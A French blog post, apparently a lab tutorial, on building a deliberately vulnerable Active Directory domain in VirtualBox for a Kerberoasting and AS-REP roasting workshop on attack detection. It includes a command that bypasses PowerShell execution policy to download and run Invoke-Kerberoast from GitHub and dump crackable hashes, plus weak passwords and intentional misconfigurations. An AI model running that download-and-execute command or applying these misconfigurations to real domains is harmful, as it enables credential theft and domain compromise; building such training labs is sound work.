---
layout: post
title: Création d'un lab Active Directory vulnérable
subtitle: Kerberoast & AS-REP roast
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
tags: [Active Directory, Windows, PowerShell, SPN, Kerberos, Kerberoast, AS-REP roast, DNS, Invoke-Kerberoast, Misconfiguration]
---

![50ba2409d3048076b90210f379ef2864.png](/img/071cc81a50664ad78ee5597f747afbb1.png)

**Afin de pouvoir réaliser la suite du workshop de F-Secure, nous allons créer une machine virtuelle Windows Server 2016, configurer Active Directory, et le rendre vulnérable à quelques attaques.**

{: .box-note}
*Remarque: Dans ce lab, les VM utilisent un accès par pont. Utilisation de VirtualBox*

- Créer une nouvelle VM et insérer l'ISO de Windows Server 2016

ISO Windows Server 2016: [https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2016](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2016){:target="_blank"}

![4b66cfd519784952459c7b72fec2ed9d.png](/img/af6d66093ad0440387cb8f1ff27a3e5c.png)

- Lancer la VM et installer Windows Server 2016

![4e0b7cd0006cd693d1404e9ec54694b6.png](/img/957919252ed84d06b0bf06adbe725878.png)

- Installer

Choisir l'option `Windows Server 2016 Standard Evaluation (Experience Utilisateur)`

![7bc9d4c817a96a39665de5fe04dfd3a7.png](/img/23f3b6255ca84cfa92657b7db2c693ba.png)

Choisir `Personnalisé`

![daabcdc117dbf40fffdca2475badb8cb.png](/img/d18a04ca90cc441da80290cb59798de1.png)

![35b78a7d8e03e630c3601e9b07261829.png](/img/914d08e0aa6a4084a44209efd5b1381f.png)

![092fd34a61e27626a97375d6104f5244.png](/img/e85be516d7f244679c2eae934c341d66.png)

La VM va redemarrer. Créer un mdp pour le compte `Administrateur`.

Utiliser une IP Statique vu qu'on va se servir du serveur comme contrôleur de domaine. Utiliser la même IP pour le serveur DNS

![47fe379bd1e6352930a01c3a51b1bc30.png](/img/dc864a67c0ec43cb911744baa8be37f2.png)

Pour installer AD via le `Gestionnaire de serveur` voir [2,3,5]. Ici, nous installerons Active Directory avec PowerShell.

**Installer AD avec PowerShell** [1]

`Install-windowsfeature AD-domain-services`

![ec4392c5d5efb816b20a1fa14d6afb24.png](/img/dbcf289c8b4741798e07934460978bbe.png)

Création du domaine

```
Import-Module ADDSDeployment
Install-ADDSForest -CreateDnsDelegation:$false ` -DatabasePath "C:\Windows\NTDS" ` -DomainMode "Win2012R2" ` -DomainName "server1.hacklab.local" ` -DomainNetbiosName "server1" `  -ForestMode "Win2012R2" `  -InstallDns:$true `  -LogPath "C:\Windows\NTDS" `  -NoRebootOnCompletion:$false `  -SysvolPath "C:\Windows\SYSVOL" `  -Force:$true
```

![a3647078abecffe08f53bea35b574a12.png](/img/507b9d9e00264c2bab9bbca510e5b50d.png)

La VM reboot et le domaine est créé

`Get-ADForest`

![7bbbbe66bd31094b9572b4dd5e429949.png](/img/c896b064d73843be948f7d8c489b32cb.png)

`Get-ADDomain`

![5fabcd0aaa8d224cce8a0b4ba29b4b63.png](/img/f452ce0a06234c3fa50c3be1ae5ac20a.png)

Pour avoir accès à internet, penser à configurer la redirection DNS avec le DNS Google [4]

- Gestionnaire DNS 

![bb94f52a42f0529e33e84baf8e0ae962.png](/img/bd6d6e597a6540439211fe0d24dcbc43.png)

- Clic droit > Propriétés > Redirecteurs

Ajouter `8.8.8.8` et `8.8.4.4`

![ab6915956c45bc3fa27b2aba600b3880.png](/img/55de5377a89f44c891fbad516d46f222.png)

- Installer RSAT-ADDS 

![7c4a569654c7edc51a8a1bee5e40ce92.png](/img/87adf136f75643908b059d998f19c665.png)

Permet d'avoir accès aux outils AD dans les outils d'admin windows

![6ab6d469ee1f77f1a5e8815780f2044e.png](/img/4a37c894d61741c0a6b8f3984c3308ad.png)

- Ajout d'un utilisateur au domaine

`net user user1 Passw0rd! /ADD /DOMAIN`

![dd010a140320e8c9ce15aeec257184fe.png](/img/c4118daaaa60431d8e9476ba23861e4a.png)

- Ajouter cet utilisateur au groupe `Admins du domaine` /!\ Bad user!!

`net group “Admins du domaine” user1 /add`

![d3db31878a7d3095871d2a83057d652a.png](/img/7bb47c789d1f4db28854bb087fbf5747.png)

Utilisateur bien créé et membre de `Admins du domaine`

![176f1aa7cc81075b6eef84b3d9721923.png](/img/1dd04129b52c474695e54a0f9528f898.png)

![2a8a00b769b2f97245d32d34fc2e19a8.png](/img/69a880e4d770467ab89c6524b78dfb6d.png)

![b9ce51f5a7cfbbe8c5ae00ea10f12a92.png](/img/680940abef0945829d1ccc4eac2112d9.png)

Vérifier que cet utilisateur a un attribut `servicePrincipalName` SPN. 

Commandes powershell listant tous les SPN [5] :

```
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(servicePrincipalName=*)"
$results = $search.Findall()
foreach($result in $results)
{
       $userEntry = $result.GetDirectoryEntry()
       Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
       Write-host "DN      =      "  $userEntry.distinguishedName
       Write-host "Object Cat. = "  $userEntry.objectCategory
       Write-host "servicePrincipalNames"
       $i=1
       foreach($SPN in $userEntry.servicePrincipalName)
       {
           Write-host "SPN(" $i ")   =      " $SPN       $i+=1
       }
       Write-host ""
}
```

![2ee24a13ceb71617cefd8925db90fe7a.png](/img/d0f90ac8c08a44f7895a074e267576a5.png)

![e60dedba1254d46e45fcbb181197247b.png](/img/5b8e89f01a684d34b16c83bb8bd84424.png)

Il existe beaucoup de scripts permettant de découvrir les SPN (impacket, Empire, etc.) Voir [6]

Ajout d'un deuxième utilisateur, c'est ce user qu'on utilisera pour se loguer sur la Win 7 (ou la Win 10)

![89cb1649b746a61cbfe00fe17737eebb.png](/img/ac878e09baa441d08043783264927766.png)

Pour download une VM Win 7 et/ou Win 10: [https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/){:target="_blank"}

Lancer la VM Win 7 et modifier le serveur DNS pour utiliser le serveur Windows 2016

![282b6d60b805cfdbf5c69b6215418fcc.png](/img/d1620c7680b345858bedc1718f70dccb.png)

Vérifier qu'on peut ping le domaine

![2eb994b52148e2c5e65618d6a214b8a5.png](/img/66f7d6c55f1d491fa324329fa8eec387.png)

`Computer > Properties > Change Settings`

![52e348dcc83de5d2f2f987e8506b80c1.png](/img/90f988d6c6c9452b856cdabf9f1b9d75.png)

Changer le nom du domaine

Ajouter l'utilisateur

![deb0b02f00a0fe1ee0c2f90099278503.png](/img/e447764f96cb43279330b369644aa0eb.png)

![20e3b5a23e08cf054c7fa4af47e40236.png](/img/18c073204351489cb1fd1a134034430f.png)

Rebooter

![8ec6b13835d53ec6ff073ab3d5355429.png](/img/19dfea56f18c418b90e8248008a4b88d.png)

![49a89c629f5daa2471a2578d19ae2f87.png](/img/866a268640a04e00971c0fa916653cd5.png)

Même chose pour Windows 10

Changer le DNS et le nom de domaine, ajouter l'utilisateur

![b7f0fe2665a257405c30444ab843a7ff.png](/img/a6b9cfa2727e40468d0fbb55bf12d09f.png)

![c0bf7edf1728fd1e3c7ce5ef83d79c14.png](/img/c050119edf5746158b65f97765644801.png)

Afin de pouvoir exploiter ce lab plus tard, nous allons créer deux *misconfiguration* permettant les attaques Kerberoasting et AS-REP roasting.

Pour implenter d'autres vulnérabiltiés, voir [7]

**1. Kerberoasting**

![4841aac631175076eda8f5956fc0ac20.png](/img/d51021ff5c7a4fd2928ffdf6842dd55d.png)
*Source [7]*

Sur le serveur:

```
PS > setspn -s http/server1.hacklab.local:80 user1
```

![7314117416f2a2dd2818d6100c0350d8.png](/img/1e9ac8fa2ab248d083479a91c1b32969.png)

Test avec `Invoke-Kerberoast` sur la Win 7 [8]

`powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/myexploit/PS_Scripts_Backup/master/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt"`

![f7424c33191313a031e23a84810d56b4.png](/img/e6f732a518ce410c9a4eee2e0bc0ff0c.png)

![74dd5d5be427825f13cda16842bb3134.png](/img/97ea130c4064448f8123a0071397a017.png)

Crackable avec Hashcat. Pour plus de détails sur les étapes de l'attaque Kerberoast, voir [9]

**2. AS-REP roasting**

![d0237a2519db59878701c73c04810505.png](/img/4d81eb9437e14532b14d22f976057b40.png)
*Source: [7]*

Créer un nouvel utilisateur

![2ac61ae23960f155d5d0b8a43fd7f425.png](/img/9982efc6c2ee40a3bd8b2c0c437ca4ea.png)

![4b449a43fe4c1728757ba3d43b9054ed.png](/img/0774bc1752b045ffb9d7d3124e78040c.png)

![d1667d18e944ec73a25e8114a10bcbec.png](/img/297d4393cc084f86b120a2674e9cd3b8.png)

`user2::Passw0rd!`

Dans les propriétés du compte, cocher `La pré-authentification Kerberos n'est pas nécessaire`

![6163bbc483e5465398e5bc0b68df9922.png](/img/d724d90fc86846e49d2a2454608f1a49.png)

Ce compte est désormais vulnérable à l'*AS-REP roasting*

# Conclusion

Dans ce lab, nous avons créé une infrastructure Active Directory vulnérable au Kerberoasting et au AS-REP roasting.

Dans la suite du workshop *Attack Detection Fundamentals* de F-Secure nous exploiterons ces vulnérabilités et le analyserons à la recherche d'indicateurs de compromission.

# Références

[1] 1337Red, *Building and Attacking An Active Directory Lab With Powershell*, [https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/){:target="_blank"}

[2] Vartai Security, *Lab Building Guide: Virtual Active Directory*, [https://medium.com/@vartaisecurity/lab-building-guide-virtual-active-directory-5f0d0c8eb907](https://medium.com/@vartaisecurity/lab-building-guide-virtual-active-directory-5f0d0c8eb907){:target="_blank"}

[3] Robert Scocca, *Building an Active Directory Lab*, [https://robertscocca.medium.com/building-an-active-directory-lab-82170dd73fb4](https://robertscocca.medium.com/building-an-active-directory-lab-82170dd73fb4){:target="_blank"}

[4] *Configuration DNS sur Windows Server 2016*, [https://no-impact.eu/do-it-yourself-post-6-Configuration-DNS-sur-Windows-Server-2016](https://no-impact.eu/do-it-yourself-post-6-Configuration-DNS-sur-Windows-Server-2016){:target="_blank"}

[5] Microsoft, *Active Directory: PowerShell script to list all SPNs used*, [https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx](https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx){:target="_blank"}

[6] Pentestlab, *SPN Discovery*, [https://pentestlab.blog/2018/06/04/spn-discovery/](https://pentestlab.blog/2018/06/04/spn-discovery/){:target="_blank"}

[7] SEC Consult, *Creating Active Directory Labs for Blue and Red Teams*, [https://sec-consult.com/blog/detail/creating-active-directory-labs-for-blue-and-red-teams/](https://sec-consult.com/blog/detail/creating-active-directory-labs-for-blue-and-red-teams/){:target="_blank"}

[8] m0chan, *How To Attack Kerberos 101*, [https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#invoke-kerberoastps1](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#invoke-kerberoastps1){:target="_blank"}

[9] Pentestlab, *Kerberoast*, [https://pentestlab.blog/2018/06/12/kerberoast/](https://pentestlab.blog/2018/06/12/kerberoast/){:target="_blank"}

**Poursuivez avec :** 

- [SSH Port Forwarding - Cheat Sheet](https://0xss0rz.github.io/2020-11-21-SSH-Tunneling/)

- [Attack Detection Fundamentals - Initial Access Lab 3](https://0xss0rz.github.io/2021-01-06-Attack-Detection-Initial-Access-3/)

- [Hack The Box - Remote](https://0xss0rz.github.io/2020-08-23-HTB-Remote/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
